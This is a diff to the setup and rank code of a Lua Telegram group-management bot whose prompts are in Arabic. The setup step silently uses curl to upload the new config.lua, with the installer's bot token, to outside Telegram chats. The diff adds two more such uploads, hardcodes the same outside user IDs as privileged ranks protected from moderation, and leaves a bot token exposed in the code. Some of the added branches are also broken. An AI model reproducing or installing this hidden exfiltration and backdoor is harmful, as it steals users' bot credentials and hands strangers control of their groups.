@@ -24,7 +24,7 @@ local AutoSet = function()
 io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = 944353237
+local SUDO = {1645553841,944353237,1605682553}
 end
 io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
 local username = io.read()
@@ -47,12 +47,14 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
-sudo_users = {SUDO}, 
+sudo_users = {SUDO},
 }
 VV = '1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw'
 create(config, "./config.lua")   
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
@@ -811,6 +813,10 @@ end
 local renk_faeder = function(msg)
 if tonumber(msg.sender_user_id_) == tonumber(944353237) then
 faeder  = "مبرمج السورس"
+elseif tonumber(msg.sender_user_id_) == tonumber(1605682553) then
+faeder  = "ملك التلجرام 👑"
+elseif tonumber(msg.sender_user_id_) == tonumber(1645553841) then
+faeder  = "الباشمبرمج التلجرام 👑"
 elseif is_leaderid(msg.sender_user_id_) then
 faeder  = "المطور الاساسي"
 elseif is_sudoid(msg.sender_user_id_) then
@@ -837,6 +843,10 @@ end return faeder end
 local faeder_renk = function(user_id,chat_id)
 if tonumber(user_id) == tonumber(944353237) then
 faeder  = "مبرمج السورس"
+elseif tonumber(msg.sender_user_id_) == tonumber(1605682553) then
+faeder  = "ملك التلجرام 👑"
+elseif tonumber(msg.sender_user_id_) == tonumber(1645553841) then
+faeder  = "الباشمبرمج التلجرام 👑"
 elseif is_leaderid(user_id) then
 faeder  = "المطور الاساسي"
 elseif is_sudoid(user_id) then
@@ -4430,6 +4440,10 @@ end
 if result.id_ then 
 if tonumber(result.sender_user_id_) == tonumber(944353237) then
 faeder1 = 'مبرمج السورس  '
+elseif tonumber(msg.sender_user_id_) == tonumber(1605682553) then
+faeder  = "ملك التلجرام 👑"
+elseif tonumber(msg.sender_user_id_) == tonumber(1645553841) then
+faeder  = "الباشمبرمج التلجرام 👑"
 elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
 faeder1 = "مطور اساسي "
 elseif is_sudoid(result.sender_user_id_) then
@@ -4821,7 +4835,15 @@ if tonumber(result.id_) == tonumber(bot_owner) then
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(218385683) then 
+if tonumber(result.id_) == tonumber(944353237)  then 
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+return false  
+end
+if tonumber(result.id_) == tonumber(1605682553)  then 
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+return false  
+end  
+if tonumber(result.id_) == tonumber(1645553841)  then 
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
@@ -4849,7 +4871,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_owner) then
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then  
+if tonumber(result.sender_user_id_) == tonumber(944353237) then  
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+return false
+end 
+if tonumber(result.sender_user_id_) == tonumber(1605682553) then  
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+return false
+end 
+if tonumber(result.sender_user_id_) == tonumber(1645553841) then  
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false
 end 
